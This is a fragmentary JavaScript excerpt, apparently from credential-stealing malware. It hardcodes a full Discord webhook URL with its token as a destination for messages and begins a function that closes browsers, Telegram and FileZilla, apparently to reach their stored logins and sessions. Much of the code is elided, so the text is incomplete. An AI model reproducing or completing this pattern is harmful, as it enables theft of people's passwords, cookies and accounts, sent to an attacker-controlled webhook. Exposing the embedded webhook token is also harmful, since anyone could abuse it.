...
const webhook3939 = "https://discord.com/api/webhooks/1383356827672121404/kd0qMLUTKET95ngtDxsvyCglhSvi6QpK1rKskB-w4GTrftJif0LbPm9crLIL060Tp7s8"
        ...
        embeds: [
            {
                ...
                color: 3447003 // Mavi rengin kodu (örnekte 3447003)
            }
        ],
    };
...
async function closeBrowsers() {
  const browsersProcess = ["chrome.exe", "Telegram.exe", "filezilla.exe", "msedge.exe", "opera.exe", "brave.exe"];
